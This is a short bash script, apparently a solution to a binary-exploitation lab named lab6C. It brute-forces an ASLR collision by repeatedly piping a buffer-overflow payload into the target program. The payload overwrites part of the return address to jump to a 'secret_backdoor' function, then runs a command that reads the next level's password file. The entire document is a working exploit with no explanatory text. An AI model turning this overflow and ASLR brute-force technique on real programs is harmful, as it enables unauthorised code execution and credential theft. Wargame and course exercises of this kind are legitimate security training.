#!/bin/bash

echo Brute-force\'ing for ASLR collision with secret_backdoor at 0xb776772
while true
do 
	python -c 'print "A"*40 + "\xff" + "B"*282 + "\x2b\x77\x76\xb7\n(cat /home/lab6B/.pass)\n"' | ./lab6C | grep -E "^[a-zA-Z0-9_\-]{12,}" && break
done
